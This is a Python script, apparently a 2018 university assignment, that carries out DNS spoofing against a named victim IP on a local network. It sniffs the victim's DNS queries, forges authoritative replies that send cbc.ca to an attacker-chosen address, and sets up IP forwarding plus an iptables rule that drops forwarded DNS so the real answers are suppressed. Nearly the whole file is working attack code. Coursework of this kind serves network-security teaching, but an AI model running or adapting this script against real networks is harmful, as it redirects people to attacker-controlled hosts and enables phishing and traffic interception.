#!/usr/bin/python

# Author(s):  Brandon Gillespie, Justen DePourcq
# Date:       Sunday November 4th, 2018
# Assignment: Assignment 4

import signal
import uuid
import sys
import socket
import pcapy
import threading
import time
from uuid import getnode as get_mac
from scapy.all import *
from multiprocessing import *
from subprocess import Popen, PIPE

spoof_sites = [["cbc.ca", "142.232.66.1"]]

#
# Applies the filter to sniff_filter based off our target ip
# if we find any, we go to check_dns
#
def spoof_dns():
    sniff_filter = "udp and port 53 and src " + str(target_ip)
    sniff(filter=sniff_filter, prn=check_dns)

#
# Checks to see if the website is one that we are spoofing,
#
def check_dns(packet):
    for x in range(len(spoof_sites)):
        if spoof_sites[x][0] in packet.getlayer(DNS).qd.qname:
            handle_dns_packet(packet, spoof_sites[x][1])
            print(str(packet.getlayer(DNS).qd.qname + " found.. Sending them to: " + spoof_sites[x][1]))

#
# Actually parse our dns packet, craft our response, and
# send it
#
def handle_dns_packet(packet, ip):
    ans = DNSRR(rrname=packet[DNS].qd.qname, ttl=200, rdata=ip)
    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=ans)
    response = IP(dst=target_ip, src=packet[IP].dst) / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /dns
    send(response, verbose=0)

#
# Print out the vicitm IP
#
def print_victim_ip():
    sys.stdout.write("Victim  : " + target_ip + '\n')

#
# Create a firewall rule to block all dns.
# Apply IPv4 forwarding
#
def setup():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("\nInvalid number of arguments")
        print("Usage: ./dns_spoof.py AttackerIP VictimIP GatewayIP\n")
        exit()

    setup()

    my_ip = sys.argv[1]
    target_ip = sys.argv[2]
    router_ip = sys.argv[3]

    print_victim_ip()
    spoof_dns()
